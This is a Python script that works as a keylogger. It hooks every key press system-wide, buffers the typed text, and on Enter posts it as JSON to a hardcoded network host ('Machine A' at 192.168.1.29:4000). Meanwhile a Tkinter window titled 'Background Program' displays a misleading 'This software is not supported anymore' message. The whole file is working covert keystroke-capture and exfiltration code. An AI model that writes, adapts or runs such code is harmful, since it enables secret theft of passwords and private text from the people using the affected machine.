import aiohttp
import asyncio
import keyboard
import threading
import tkinter as tk

async def sendNum(number, url, payload):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as response:
                if response.status == 200:
                    print(f"Number {number} sent successfully to Machine A")
                else:
                    print("Failed to send number to Machine A")
        except aiohttp.ClientError as e:
            print(f"Error sending number {number} to Machine A: {e}")

cur = []

def on_key_event(event):
    global cur

    if event.event_type == keyboard.KEY_DOWN:
        if event.name == 'enter':
            asyncio.run(send())
        elif event.name == "space":
            cur.append(" ")
        elif event.name == "backspace":
            pass
        else:
            cur.append(event.name)

async def send():
    global cur
    url = "http://192.168.1.29:4000/"
    userInput = "".join(cur)
    payload = {"number": userInput}
    await sendNum(userInput, url, payload)
    cur = []

async def main():
    keyboard.on_press(on_key_event)
    await asyncio.sleep(float('inf'))

def gui():
    root = tk.Tk()
    root.title("Background Program")
    root.geometry("250x150")
    label = tk.Label(root, text="test 123")
    label.pack(expand=True, fill='both', anchor='center', padx=20, pady=20)
    
    def update_label():
        label.config(text="This software is not supported anymore.") 
        root.after(1000, update_label)
    
    update_label()
    root.mainloop()

if __name__ == "__main__":
    threading.Thread(target=gui, daemon=True).start()
    asyncio.run(main())
